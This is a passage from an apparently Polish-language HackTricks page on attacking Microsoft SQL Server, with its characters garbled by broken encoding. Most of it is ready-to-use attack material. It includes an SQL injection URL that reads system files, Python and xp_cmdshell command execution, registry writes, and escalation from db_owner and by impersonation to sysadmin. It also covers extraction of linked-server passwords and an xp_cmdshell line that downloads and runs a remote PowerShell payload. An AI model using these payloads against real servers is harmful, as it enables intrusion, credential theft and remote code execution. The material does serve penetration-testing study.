Keep in mind that this technique may not work on all versions of Microsoft SQL Server, as error messages can be customized or disabled. It is important to test different error-based vectors and analyze the responses to determine if a SQL injection vulnerability exists.
```
https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--
```
### **RCE/Odczyt plik√≥w i wykonywanie skrypt√≥w (Python i R)**

MSSQL mo≈ºe umo≈ºliwiƒá wykonanie **skrypt√≥w w jƒôzykach Python i/lub R**. Ten kod zostanie wykonany przez **innego u≈ºytkownika** ni≈º ten, kt√≥ry u≈ºywa **xp\_cmdshell** do wykonywania polece≈Ñ.

Przyk≈Çad pr√≥by wykonania **'R'** _"Hellow World!"_ **nie dzia≈Ça**:

![](<../../.gitbook/assets/image (185) (1).png>)

Przyk≈Çad u≈ºycia skonfigurowanego Pythona do wykonania kilku dzia≈Ça≈Ñ:
```sql
# Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```
### Odczytaj rejestr

Microsoft SQL Server udostƒôpnia **wiele rozszerzonych procedur sk≈Çadowanych**, kt√≥re umo≈ºliwiajƒÖ interakcjƒô nie tylko z sieciƒÖ, ale tak≈ºe z systemem plik√≥w i nawet z [**Rejestrem systemu Windows**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)**:**

| **Zwyk≈Çe**                   | **Z uwzglƒôdnieniem instancji**          |
| ---------------------------- | -------------------------------------- |
| sys.xp\_regread              | sys.xp\_instance\_regread              |
| sys.xp\_regenumvalues        | sys.xp\_instance\_regenumvalues        |
| sys.xp\_regenumkeys          | sys.xp\_instance\_regenumkeys          |
| sys.xp\_regwrite             | sys.xp\_instance\_regwrite             |
| sys.xp\_regdeletevalue       | sys.xp\_instance\_regdeletevalue       |
| sys.xp\_regdeletekey         | sys.xp\_instance\_regdeletekey         |
| sys.xp\_regaddmultistring    | sys.xp\_instance\_regaddmultistring    |
| sys.xp\_regremovemultistring | sys.xp\_instance\_regremovemultistring |
```sql
# Example read registry
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 'WorkingDirectory';
# Example write and then read registry
EXECUTE master.sys.xp_instance_regwrite 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue', 'REG_SZ', 'Now you see me!';
EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue';
# Example to check who can use these functions
Use master;
EXEC sp_helprotect 'xp_regread';
EXEC sp_helprotect 'xp_regwrite';
```
Dla **wiƒôcej przyk≈Çad√≥w** sprawd≈∫ [**oryginalne ≈∫r√≥d≈Ço**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/).

### RCE z u≈ºyciem funkcji zdefiniowanej przez u≈ºytkownika MSSQL - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Mo≈ºliwe jest **za≈Çadowanie pliku .NET dll wewnƒÖtrz MSSQL z niestandardowymi funkcjami**. Wymaga to jednak dostƒôpu `dbo`, wiƒôc potrzebujesz po≈ÇƒÖczenia z bazƒÖ danych **jako `sa` lub z rolƒÖ Administratora**.

[Kliknij tutaj](../../pentesting-web/sql-injection/mssql-injection.md#mssql-user-defined-function-sqlhttp), aby zobaczyƒá przyk≈Çad.

### Inne sposoby na RCE

IstniejƒÖ inne metody uzyskania wykonania polece≈Ñ, takie jak dodawanie [rozszerzonych procedur sk≈Çadowanych](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [zestaw√≥w CLR](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [zada≈Ñ agenta SQL Server](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15) i [skrypt√≥w zewnƒôtrznych](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajduj podatno≈õci, kt√≥re majƒÖ najwiƒôksze znaczenie, aby≈õ m√≥g≈Ç je szybko naprawiƒá. Intruder ≈õledzi twojƒÖ powierzchniƒô ataku, wykonuje proaktywne skanowanie zagro≈ºe≈Ñ, znajduje problemy w ca≈Çym stosie technologicznym, od interfejs√≥w API po aplikacje internetowe i systemy chmurowe. [**Wypr√≥buj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) ju≈º dzi≈õ.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Eskalacja uprawnie≈Ñ MSSQL

### Od db\_owner do sysadmin

Je≈õli **zwyk≈Çy u≈ºytkownik** otrzyma rolƒô **`db_owner`** nad bazƒÖ danych, kt√≥rej w≈Ça≈õcicielem jest u≈ºytkownik admin (takim jak **`sa`**), a ta baza danych jest skonfigurowana jako **`trustworthy`**, ten u≈ºytkownik mo≈ºe wykorzystaƒá te uprawnienia do **privesc**, poniewa≈º wewnƒÖtrz bazy danych mo≈ºna tworzyƒá procedury sk≈Çadowane, kt√≥re mogƒÖ byƒá uruchamiane jako w≈Ça≈õciciel (**admin**).
```sql
# Get owners of databases
SELECT suser_sname(owner_sid) FROM sys.databases

# Find trustworthy databases
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;

# Get roles over the selected database (look for your username as db_owner)
USE <trustworthy_db>
SELECT rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)

# If you found you are db_owner of a trustworthy database, you can privesc:
--1. Create a stored procedure to add your user to sysadmin role
USE <trustworthy_db>

CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'USERNAME','sysadmin'

--2. Execute stored procedure to get sysadmin role
USE <trustworthy_db>
EXEC sp_elevate_me

--3. Verify your user is a sysadmin
SELECT is_srvrolemember('sysadmin')
```
Mo≈ºesz u≈ºyƒá modu≈Çu **metasploit**:
```bash
msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
```
Lub skrypt **PS**:
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
```
### Podszywanie siƒô pod innych u≈ºytkownik√≥w

SQL Server posiada specjalne uprawnienie o nazwie **`IMPERSONATE`**, kt√≥re **pozwala u≈ºytkownikowi na przejƒôcie uprawnie≈Ñ innego u≈ºytkownika** lub logowania, dop√≥ki kontekst nie zostanie zresetowany lub sesja nie zostanie zako≈Ñczona.
```sql
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```
{% hint style="info" %}
Je≈õli mo≈ºesz podszyƒá siƒô pod u≈ºytkownika, nawet je≈õli nie jest on sysadminem, powiniene≈õ sprawdziƒá, **czy u≈ºytkownik ma dostƒôp** do innych **baz danych** lub po≈ÇƒÖczonych serwer√≥w.
{% endhint %}

Nale≈ºy zauwa≈ºyƒá, ≈ºe po uzyskaniu uprawnie≈Ñ sysadmina mo≈ºna podszyƒá siƒô pod dowolnego innego u≈ºytkownika:
```sql
-- Impersonate RegUser
EXECUTE AS LOGIN = 'RegUser'
-- Verify you are now running as the the MyUser4 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Change back to sa
REVERT
```
Mo≈ºesz przeprowadziƒá ten atak za pomocƒÖ modu≈Çu **metasploit**:
```bash
msf> auxiliary/admin/mssql/mssql_escalate_execute_as
```
lub za pomocƒÖ skryptu **PS**:
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
```
## Wykorzystanie MSSQL do trwa≈Ço≈õci

[https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)

## Wyodrƒôbnianie hase≈Ç z po≈ÇƒÖczonych serwer√≥w SQL Server
AtakujƒÖcy mo≈ºe wyodrƒôbniƒá has≈Ça z po≈ÇƒÖczonych serwer√≥w SQL Server z instancji SQL i uzyskaƒá je w postaci tekstu jawnego, co umo≈ºliwia atakujƒÖcemu uzyskanie hase≈Ç, kt√≥re mogƒÖ byƒá wykorzystane do zdobycia wiƒôkszej przewagi na celu.
Skrypt do wyodrƒôbniania i deszyfrowania hase≈Ç przechowywanych dla po≈ÇƒÖczonych serwer√≥w mo≈ºna znale≈∫ƒá [tutaj](https://www.richardswinbank.net/admin/extract_linked_server_passwords)

Aby ten exploit dzia≈Ça≈Ç, nale≈ºy spe≈Çniƒá pewne wymagania i dokonaƒá konfiguracji.
Przede wszystkim musisz mieƒá uprawnienia administratora na maszynie lub mo≈ºliwo≈õƒá zarzƒÖdzania konfiguracjami serwera SQL.

Po sprawdzeniu uprawnie≈Ñ musisz skonfigurowaƒá trzy rzeczy, a mianowicie:
1. W≈ÇƒÖcz protok√≥≈Ç TCP/IP na instancjach serwera SQL;
2. Dodaj parametr uruchamiania, w tym przypadku zostanie dodana flaga ≈õledzenia, kt√≥ra to flaga to -T7806.
3. W≈ÇƒÖcz zdalne po≈ÇƒÖczenie administracyjne.

Aby zautomatyzowaƒá te konfiguracje, [ten repozytorium](https://github.com/IamLeandrooooo/SQLServerLinkedServersPasswords/) zawiera potrzebne skrypty.
Opr√≥cz posiadania skryptu PowerShell dla ka≈ºdego kroku konfiguracji, repozytorium zawiera r√≥wnie≈º pe≈Çny skrypt, kt√≥ry ≈ÇƒÖczy skrypty konfiguracyjne z wyodrƒôbnianiem i deszyfrowaniem hase≈Ç.

Aby uzyskaƒá dalsze informacje, odno≈õnie tego ataku, odwo≈Çaj siƒô do nastƒôpujƒÖcych link√≥w:
[Decrypting MSSQL Database Link Server Passwords](https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-database-link-server-passwords/)

[Troubleshooting the SQL Server Dedicated Administrator Connection](https://www.mssqltips.com/sqlservertip/5364/troubleshooting-the-sql-server-dedicated-administrator-connection/)

## Podwy≈ºszanie uprawnie≈Ñ lokalnych

U≈ºytkownik uruchamiajƒÖcy serwer MSSQL bƒôdzie mia≈Ç w≈ÇƒÖczone uprawnienie **SeImpersonatePrivilege.**\
Prawdopodobnie bƒôdziesz w stanie **podwy≈ºszyƒá uprawnienia do Administratora** korzystajƒÖc z jednej z tych 2 stron:

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/juicypotato.md" %}
[juicypotato.md](../../windows-hardening/windows-local-privilege-escalation/juicypotato.md)
{% endcontent-ref %}

## Shodan

* `port:1433 !HTTP`

## Odwo≈Çania

* [https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users](https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users)
* [https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/](https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/)
* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
* [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)

‚Äã

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajd≈∫ najwa≈ºniejsze podatno≈õci, aby szybko je naprawiƒá. Intruder ≈õledzi powierzchniƒô ataku, wykonuje skanowanie zagro≈ºe≈Ñ, znajduje problemy w ca≈Çym stosie technologicznym, od interfejs√≥w API po aplikacje internetowe i systemy chmurowe. [**Wypr√≥buj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) ju≈º dzi≈õ.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Automatyczne polecenia HackTricks
```
Protocol_Name: MSSQL    #Protocol Abbreviation if there is one.
Port_Number:  1433     #Comma separated if there is more than one.
Protocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MSSQL
Note: |
Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications‚Äîwhich may run either on the same computer or on another computer across a network (including the Internet).

#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G

###the goal is to get xp_cmdshell working###
1. try and see if it works
xp_cmdshell `whoami`
go

2. try to turn component back on
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell `whoami`
go

3. 'advanced' turn it back on
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go




xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')"


https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server

Entry_2:
Name: Nmap for SQL
Description: Nmap with SQL Scripts
Command: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}

Entry_3:
Name: MSSQL consolesless mfs enumeration
Description: MSSQL enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit'

```
<details>

<summary><strong>Naucz siƒô hakowaƒá AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Je≈õli chcesz zobaczyƒá swojƒÖ **firmƒô reklamowanƒÖ w HackTricks** lub **pobraƒá HackTricks w formacie PDF**, sprawd≈∫ [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobƒÖd≈∫ [**oficjalne gad≈ºety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinƒô PEASS**](https://opensea.io/collection/the-peass-family), naszƒÖ kolekcjƒô ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Do≈ÇƒÖcz do** üí¨ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siƒô swoimi sztuczkami hakerskimi, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori√≥w github.

</details>
